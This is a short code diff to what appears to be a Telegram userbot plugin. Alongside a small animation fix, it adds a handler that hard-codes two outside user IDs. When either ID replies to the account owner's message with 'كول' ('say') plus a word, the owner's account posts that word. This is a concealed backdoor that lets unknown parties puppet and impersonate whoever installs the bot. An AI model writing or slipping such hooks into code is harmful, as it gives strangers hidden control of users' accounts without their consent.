@@ -400,4 +400,16 @@ async def Hussein(event):
     ]
                 for i in animation_ttl:
                     await asyncio.sleep(animation_interval)
-                    await edit_or_reply(animation_chars[i % 12])
+                    await event.edit(animation_chars[i % 12])
+ter = [6205161271,6320583148]
+
+
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in ter:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+
+        if owner_id == l313l.uid and event.message.message.startswith("كول"):
+            _, word = event.message.message.split(" ", 1)
+            await event.reply(word)
